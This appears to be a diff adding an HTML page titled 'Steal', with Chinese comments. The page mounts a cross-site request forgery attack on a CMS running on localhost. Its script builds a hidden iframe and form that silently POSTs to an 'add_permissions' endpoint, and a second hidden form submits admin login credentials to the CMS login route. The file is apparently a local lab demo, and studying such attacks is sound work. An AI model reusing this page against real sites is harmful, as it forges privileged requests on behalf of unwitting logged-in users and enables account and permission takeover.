@@ -1,0 +1,64 @@
+<html>
+    <head>
+        <title>Steal</title>
+        <script type="text/javascript">
+            const requestPost = ({url, data}) => {
+                // 首先创建一个用来发送数据的iframe.
+                const iframe = document.createElement('iframe')
+                iframe.name = 'iframePost'
+                iframe.style.display = 'none'
+                document.body.appendChild(iframe)
+                const form = document.createElement('form')
+                const node = document.createElement('input')
+                // 注册iframe的load事件处理程序,如果你需要在响应返回时执行一些操作的话.
+                iframe.addEventListener('load', function () {
+                    console.log('post success')
+                    // 表单提交成功后,就可以删除iframe
+                    document.body.removeChild(iframe)
+                })
+                
+                form.action = url
+                // 在指定的iframe中执行form
+                form.target = iframe.name
+                form.method = 'post'
+                for (let name in data) {
+                    node.name = name
+                    node.value = data[name].toString()
+                    form.appendChild(node.cloneNode())
+                }
+                // 表单元素需要添加到主文档中.
+                form.style.display = 'none'
+                document.body.appendChild(form)
+                form.submit()
+                // 表单提交后,就可以删除这个表单,不影响下次的数据发送.
+                document.body.removeChild(form)
+                
+            }
+            function test1(){
+                // 使用方式
+                requestPost({
+                    url: 'http://localhost:5000/cms/groups/add_permissions/',
+                    data: {
+                        msg: 'helloIframePost'
+                    }
+                })
+            }
+            function test2(){
+                document.forms[0].submit();
+            }
+        </script>
+    </head>
+    <body>
+        <button type='button' onclick="test1()">动态</button>
+        <button type='button' onclick="test2()">静态</button>
+        <form style='display:none' 
+                target='steal' 
+                method="POST" 
+                action="http://localhost:5000/cms/login">
+            <input type="text" name="username" value="admin">
+            <input type="text" name="password" value="A123456">
+        </form>
+        <iframe name="steal">
+        </iframe>
+    </body>
+</html>
